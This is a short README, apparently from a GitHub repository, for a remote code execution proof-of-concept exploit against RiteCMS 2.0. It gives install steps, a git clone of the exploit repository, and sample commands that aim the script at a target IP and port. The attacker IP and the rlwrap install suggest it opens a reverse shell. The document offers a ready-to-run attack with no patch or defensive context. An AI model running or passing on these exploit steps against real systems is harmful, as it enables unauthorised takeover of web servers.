# RiteCMS-2.0-Remote-Code-Execution
Remote Code Execution PoC to exploit RiteCMS 2.0
```
python3 ritecms2.0-exploit.py -i <IP> -t <target-IP> -p <port>
```
### Install pip
```
pip3 install requests
pip3 install argparse
pip3 install subprocess
```
### Install rlwrap
```
sudo apt install rlwrap
```
## Steps to reproduce
```
git clone https://github.com/x0root/RiteCMS-2.0-RCE-PoC && cd RiteCMS-2.0-RCE-PoC
```
```
python3 ritecms2.0-exploit.py -i 192.168.1.10 -t 192.168.1.20 -p 4444
```

## NOTE
If first run does not work, try to run again.
